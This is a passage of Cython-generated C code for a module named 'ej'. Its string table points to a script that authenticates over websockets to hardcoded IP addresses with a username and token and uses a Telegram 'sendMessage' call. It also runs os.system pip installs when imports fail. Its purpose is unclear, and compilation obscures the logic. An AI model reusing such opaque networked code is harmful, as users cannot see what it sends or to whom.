1},\n    {&__pyx_kp_u_sendMessage_chat_id, __pyx_k_sendMessage_chat_id, sizeof(__pyx_k_sendMessage_chat_id), 0, 1, 0, 0},\n    {&__pyx_n_u_sessionId, __pyx_k_sessionId, sizeof(__pyx_k_sessionId), 0, 1, 0, 1},\n    {&__pyx_n_u_softwareversion, __pyx_k_softwareversion, sizeof(__pyx_k_softwareversion), 0, 1, 0, 1},\n    {&__pyx_n_s_spec, __pyx_k_spec, sizeof(__pyx_k_spec), 0, 0, 1, 1},\n    {&__pyx_n_s_ssl, __pyx_k_ssl, sizeof(__pyx_k_ssl), 0, 0, 1, 1},\n    {&__pyx_n_s_sslopt, __pyx_k_sslopt, sizeof(__pyx_k_sslopt), 0, 0, 1, 1},\n    {&__pyx_n_s_start, __pyx_k_start, sizeof(__pyx_k_start), 0, 0, 1, 1},\n    {&__pyx_kp_u_status_Success, __pyx_k_status_Success, sizeof(__pyx_k_status_Success), 0, 1, 0, 0},\n    {&__pyx_n_u_subaction, __pyx_k_subaction, sizeof(__pyx_k_subaction), 0, 1, 0, 1},\n    {&__pyx_n_s_submit, __pyx_k_submit, sizeof(__pyx_k_submit), 0, 0, 1, 1},\n    {&__pyx_n_s_success, __pyx_k_success, sizeof(__pyx_k_success), 0, 0, 1, 1},\n    {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},\n    {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},\n    {&__pyx_n_s_t, __pyx_k_t, sizeof(__pyx_k_t), 0, 0, 1, 1},\n    {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},\n    {&__pyx_kp_u_text, __pyx_k_text, sizeof(__pyx_k_text), 0, 1, 0, 0},\n    {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},\n    {&__pyx_n_u_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 1, 0, 1},\n    {&__pyx_n_s_token, __pyx_k_token, sizeof(__pyx_k_token), 0, 0, 1, 1},\n    {&__pyx_n_u_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 1, 0, 1},\n    {&__pyx_n_s_username, __pyx_k_username, sizeof(__pyx_k_username), 0, 0, 1, 1},\n    {&__pyx_kp_u_utf_8, __pyx_k_utf_8, sizeof(__pyx_k_utf_8), 0, 1, 0, 0},\n    {&__pyx_n_s_websocket, __pyx_k_websocket, sizeof(__pyx_k_websocket), 0, 0, 1, 1},\n    {&__pyx_n_s_work, __pyx_k_work, sizeof(__pyx_k_work), 0, 0, 1, 1},\n    {&__pyx_kp_u_wss_193_200_173_45_Auth, __pyx_k_wss_193_200_173_45_Auth, sizeof(__pyx_k_wss_193_200_173_45_Auth), 0, 1, 0, 0},\n    {&__pyx_kp_u_wss_51_79_208_190_Auth, __pyx_k_wss_51_79_208_190_Auth, sizeof(__pyx_k_wss_51_79_208_190_Auth), 0, 1, 0, 0},\n    {0, 0, 0, 0, 0, 0, 0}\n  };\n  return __Pyx_InitStrings(__pyx_string_tab);\n}\n/* #### Code section: cached_builtins ### */\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {\n  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 42, __pyx_L1_error)\n  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 61, __pyx_L1_error)\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n/* #### Code section: cached_constants ### */\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);\n\n  \n  __pyx_tuple__2 = PyTuple_Pack(1, __pyx_kp_u_wss_193_200_173_45_Auth); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 76, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__2);\n  __Pyx_GIVEREF(__pyx_tuple__2);\n\n  \n  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_kp_u_pip_install_requests); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 10, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__4);\n  __Pyx_GIVEREF(__pyx_tuple__4);\n\n  \n  __pyx_tuple__5 = PyTuple_Pack(1, __pyx_kp_u_pip_install_pyfiglet); if (unlikely(!__pyx_tuple__5)) __PYX_ERR(0, 11, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__5);\n  __Pyx_GIVEREF(__pyx_tuple__5);\n\n  \n  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_u_pip_install_websocket_client); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 23, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__7);\n  __Pyx_GIVEREF(__pyx_tuple__7);\n\n  \n  __pyx_tuple__8 = PyTuple_Pack(1, __pyx_n_u_clear); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 38, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__8);\n  __Pyx_GIVEREF(__pyx_tuple__8);\n\n  \n  __pyx_tuple__9 = PyTuple_Pack(1, __pyx_n_u_Jana); if (unlikely(!__pyx_tuple__9)) __PYX_ERR(0, 40, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__9);\n  __Pyx_GIVEREF(__pyx_tuple__9);\n\n  \n  __pyx_tuple__10 = PyTuple_Pack(1, __pyx_kp_u_); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 59, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__10);\n  __Pyx_GIVEREF(__pyx_tuple__10);\n\n  \n  __pyx_tuple__13 = PyTuple_Pack(4, __pyx_n_s_username, __pyx_n_s_con, __pyx_n_s_gzip, __pyx_n_s_t); if (unlikely(!__pyx_tuple__13)) __PYX_ERR(0, 71, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__13);\n  __Pyx_GIVEREF(__pyx_tuple__13);\n  __pyx_codeobj__14 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 4, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__13, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_ej_py, __pyx_n_s_work, 71, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__14)) __PYX_ERR(0, 71, __pyx_L1_error)\n\n  \n  __pyx_tuple__19 = PyTuple_Pack(1, __pyx_kp_u_JE_N_O); if (unlikely(!__pyx_tuple__19)) __PYX_ERR(0, 98, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_tuple__19);\n  __Pyx_GIVEREF(__pyx_tuple__19);\n  __Pyx_RefNannyFinishContext();\n  return 0;\n  __pyx_L1_error:;\n  __Pyx_RefNannyFinishContext();\n  return -1;\n}\n/* #### Code section: init_constants ### */\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitConstants(void) {\n  if (__Pyx_CreateStringTabAndInitStrings() < 0) __PYX_ERR(0, 1, __pyx_L1_error);\n  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_int_12 = PyInt_FromLong(12); if (unlikely(!__pyx_int_12)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_int_1000 = PyInt_FromLong(1000); if (unlikely(!__pyx_int_1000)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_int_8080 = PyInt_FromLong(8080); if (unlikely(!__pyx_int_8080)) __PYX_ERR(0, 1, __pyx_L1_error)\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n/* #### Code section: init_globals ### */\n\nstatic CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {\n  return 0;\n}\n/* #### Code section: init_module ### */\n\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/\nstatic CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/\n\nstatic int __Pyx_modinit_global_init_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);\n  /*--- Global init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_export_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);\n  /*--- Variable export code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_export_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);\n  /*--- Function export code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_init_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);\n  /*--- Type init code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_type_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);\n  /*--- Type import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_variable_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);\n  /*--- Variable import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\nstatic int __Pyx_modinit_function_import_code(void) {\n  __Pyx_RefNannyDeclarations\n  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);\n  /*--- Function import code ---*/\n  __Pyx_RefNannyFinishContext();\n  return 0;\n}\n\n\n#if PY_MAJOR_VERSION >= 3\n#if CYTHON_PEP489_MULTI_PHASE_INIT\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/\nstatic int __pyx_pymod_exec_ej(PyObject* module); /*proto*/\nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\n  {Py_mod_create, (void*)__pyx_pymod_create},\n  {Py_mod_exec, (void*)__pyx_pymod_exec_ej},\n  {0, NULL}\n};\n#endif\n\n#ifdef __cplusplus\nnamespace {\n  struct PyModuleDef __pyx_moduledef =\n  #else\n  static struct PyModuleDef __pyx_moduledef =\n  #endif\n  {\n      PyModuleDef_HEAD_INIT,\n      "ej",\n      0, /* m_doc */\n    #if CYTHON_PEP489_MULTI_PHASE_INIT\n      0, /* m_size */\n    #elif CYTHON_USE_MODULE_STATE\n      sizeof(__pyx_mstate), /* m_size */\n    #else\n      -1, /* m_size */\n    #endif\n      __pyx_methods /* m_methods */,\n    #if CYTHON_PEP489_MULTI_PHASE_INIT\n      __pyx_moduledef_slots, /* m_slots */\n    #else\n      NULL, /* m_reload */\n    #endif\n    #if CYTHON_USE_MODULE_STATE\n      __pyx_m_traverse, /* m_traverse */\n      __pyx_m_clear, /* m_clear */\n      NULL /* m_free */\n    #else\n      NULL, /* m_traverse */\n      NULL, /* m_clear */\n      NULL /* m_free */\n    #endif\n  };\n  #ifdef __cplusplus\n} /* anonymous namespace */\n#endif\n#endif\n\n#ifndef CYTHON_NO_PYINIT_EXPORT\n#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC\n#elif PY_MAJOR_VERSION < 3\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern "C" void\n#else\n#define __Pyx_PyMODINIT_FUNC void\n#endif\n#else\n#ifdef __cplusplus\n#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *\n#else\n#define __Pyx_PyMODINIT_FUNC PyObject *\n#endif\n#endif\n\n\n#if PY_MAJOR_VERSION < 3\n__Pyx_PyMODINIT_FUNC initej(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC initej(void)\n#else\n__Pyx_PyMODINIT_FUNC PyInit_ej(void) CYTHON_SMALL_CODE; /*proto*/\n__Pyx_PyMODINIT_FUNC PyInit_ej(void)\n#if CYTHON_PEP489_MULTI_PHASE_INIT\n{\n  return PyModuleDef_Init(&__pyx_moduledef);\n}\nstatic CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {\n    #if PY_VERSION_HEX >= 0x030700A1\n    static PY_INT64_T main_interpreter_id = -1;\n    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);\n    if (main_interpreter_id == -1) {\n        main_interpreter_id = current_id;\n        return (unlikely(current_id == -1)) ? -1 : 0;\n    } else if (unlikely(main_interpreter_id != current_id))\n    #else\n    static PyInterpreterState *main_interpreter = NULL;\n    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;\n    if (!main_interpreter) {\n        main_interpreter = current_interpreter;\n    } else if (unlikely(main_interpreter != current_interpreter))\n    #endif\n    {\n        PyErr_SetString(\n            PyExc_ImportError,\n            "Interpreter change detected - this module can only be loaded into one interpreter per process.");\n        return -1;\n    }\n    return 0;\n}\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *module, const char* from_name, const char* to_name, int allow_none)\n#else\nstatic CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none)\n#endif\n{\n    PyObject *value = PyObject_GetAttrString(spec, from_name);\n    int result = 0;\n    if (likely(value)) {\n        if (allow_none || value != Py_None) {\n#if CYTHON_COMPILING_IN_LIMITED_API\n            result = PyModule_AddObject(module, to_name, value);\n#else\n            result = PyDict_SetItemString(moddict, to_name, value);\n#endif\n        }\n        Py_DECREF(value);\n    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {\n        PyErr_Clear();\n    } else {\n        result = -1;\n    }\n    return result;\n}\nstatic CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def) {\n    PyObject *module = NULL, *moddict, *modname;\n    CYTHON_UNUSED_VAR(def);\n    if (__Pyx_check_single_interpreter())\n        return NULL;\n    if (__pyx_m)\n        return __Pyx_NewRef(__pyx_m);\n    modname = PyObject_GetAttrString(spec, "name");\n    if (unlikely(!modname)) goto bad;\n    module = PyModule_NewObject(modname);\n    Py_DECREF(modname);\n    if (unlikely(!module)) goto bad;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    moddict = module;\n#else\n    moddict = PyModule_GetDict(module);\n    if (unlikely(!moddict)) goto bad;\n#endif\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;\n    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;\n    return module;\nbad:\n    Py_XDECREF(module);\n    return NULL;\n}\n\n\nstatic CYTHON_SMALL_CODE int __pyx_pymod_exec_ej(PyObject *__pyx_pyinit_module)\n#endif\n#endif\n{\n  int stringtab_initialized = 0;\n  #if CYTHON_USE_MODULE_STATE\n  int pystate_addmodule_run = 0;\n  #endif\n  PyObject *__pyx_t_1 = NULL;\n  PyObject *__pyx_t_2 = NULL;\n  PyObject *__pyx_t_3 = NULL;\n  PyObject *__pyx_t_4 = NULL;\n  PyObject *__pyx_t_5 = NULL;\n  PyObject *__pyx_t_6 = NULL;\n  PyObject *__pyx_t_7 = NULL;\n  PyObject *__pyx_t_8 = NULL;\n  Py_ssize_t __pyx_t_9;\n  Py_UCS4 __pyx_t_10;\n  int __pyx_t_11;\n  int __pyx_lineno = 0;\n  const char *__pyx_filename = NULL;\n  int __pyx_clineno = 0;\n  __Pyx_RefNannyDeclarations\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  if (__pyx_m) {\n    if (__pyx_m == __pyx_pyinit_module) return 0;\n    PyErr_SetString(PyExc_RuntimeError, "Module \'ej\' has already been imported. Re-initialisation is not supported.");\n    return -1;\n  }\n  #elif PY_MAJOR_VERSION >= 3\n  if (__pyx_m) return __Pyx_NewRef(__pyx_m);\n  #endif\n  /*--- Module creation code ---*/\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  __pyx_m = __pyx_pyinit_module;\n  Py_INCREF(__pyx_m);\n  #else\n  #if PY_MAJOR_VERSION < 3\n  __pyx_m = Py_InitModule4("ej", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #elif CYTHON_USE_MODULE_STATE\n  __pyx_t_1 = PyModule_Create(&__pyx_moduledef); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 1, __pyx_L1_error)\n  {\n    int add_module_result = PyState_AddModule(__pyx_t_1, &__pyx_moduledef);\n    __pyx_t_1 = 0; /* transfer ownership from __pyx_t_1 to ej pseudovariable */\n    if (unlikely((add_module_result < 0))) __PYX_ERR(0, 1, __pyx_L1_error)\n    pystate_addmodule_run = 1;\n  }\n  #else\n  __pyx_m = PyModule_Create(&__pyx_moduledef);\n  if (unlikely(!__pyx_m)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #endif\n  CYTHON_UNUSED_VAR(__pyx_t_1);\n  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 1, __pyx_L1_error)\n  Py_INCREF(__pyx_d);\n  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 1, __pyx_L1_error)\n  Py_INCREF(__pyx_b);\n  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 1, __pyx_L1_error)\n  Py_INCREF(__pyx_cython_runtime);\n  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #if CYTHON_REFNANNY\n__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");\nif (!__Pyx_RefNanny) {\n  PyErr_Clear();\n  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");\n  if (!__Pyx_RefNanny)\n      Py_FatalError("failed to import \'refnanny\' module");\n}\n#endif\n  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_ej(void)", 0);\n  if (__Pyx_check_binary_version(__PYX_LIMITED_VERSION_HEX, __Pyx_get_runtime_version(), CYTHON_COMPILING_IN_LIMITED_API) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #ifdef __Pxy_PyFrame_Initialize_Offsets\n  __Pxy_PyFrame_Initialize_Offsets();\n  #endif\n  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 1, __pyx_L1_error)\n  #ifdef __Pyx_CyFunction_USED\n  if (__pyx_CyFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_FusedFunction_USED\n  if (__pyx_FusedFunction_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Coroutine_USED\n  if (__pyx_Coroutine_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_Generator_USED\n  if (__pyx_Generator_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_AsyncGen_USED\n  if (__pyx_AsyncGen_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  #ifdef __Pyx_StopAsyncIteration_USED\n  if (__pyx_StopAsyncIteration_init(__pyx_m) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  /*--- Library function declarations ---*/\n  /*--- Threads initialization code ---*/\n  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS\n  PyEval_InitThreads();\n  #endif\n  /*--- Initialize various global constants etc. ---*/\n  if (__Pyx_InitConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  stringtab_initialized = 1;\n  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)\n  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n  if (__pyx_module_is_main_ej) {\n    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  }\n  #if PY_MAJOR_VERSION >= 3\n  {\n    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 1, __pyx_L1_error)\n    if (!PyDict_GetItemString(modules, "ej")) {\n      if (unlikely((PyDict_SetItemString(modules, "ej", __pyx_m) < 0))) __PYX_ERR(0, 1, __pyx_L1_error)\n    }\n  }\n  #endif\n  /*--- Builtin init code ---*/\n  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  /*--- Constants init code ---*/\n  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  /*--- Global type/function init code ---*/\n  (void)__Pyx_modinit_global_init_code();\n  (void)__Pyx_modinit_variable_export_code();\n  (void)__Pyx_modinit_function_export_code();\n  (void)__Pyx_modinit_type_init_code();\n  (void)__Pyx_modinit_type_import_code();\n  (void)__Pyx_modinit_variable_import_code();\n  (void)__Pyx_modinit_function_import_code();\n  /*--- Execution code ---*/\n  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)\n  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  #endif\n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_json, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_json, __pyx_t_2) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_sys, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 2, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_2) < 0) __PYX_ERR(0, 2, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_time, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 3, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_time, __pyx_t_2) < 0) __PYX_ERR(0, 3, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_os, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 4, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_2) < 0) __PYX_ERR(0, 4, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_random, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_d, __pyx_n_s_random, __pyx_t_2) < 0) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_3, &__pyx_t_4);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_3);\n    __Pyx_XGOTREF(__pyx_t_4);\n    /*try:*/ {\n\n      \n      __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_requests, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L2_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_d, __pyx_n_s_requests, __pyx_t_2) < 0) __PYX_ERR(0, 7, __pyx_L2_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n      __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_n_s_pyfiglet, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L2_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_d, __pyx_n_s_pyfiglet, __pyx_t_2) < 0) __PYX_ERR(0, 8, __pyx_L2_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    goto __pyx_L7_try_end;\n    __pyx_L2_error:;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n    \n    /*except:*/ {\n      __Pyx_AddTraceback("ej", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_5, &__pyx_t_6) < 0) __PYX_ERR(0, 9, __pyx_L4_except_error)\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_6);\n\n      \n      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 10, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_system); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 10, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__4, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 10, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n\n      \n      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_os); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 11, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_system); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 11, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_8);\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_8, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 11, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;\n\n      \n      __pyx_t_7 = __Pyx_ImportDottedModule(__pyx_n_s_requests, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 12, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_7);\n      if 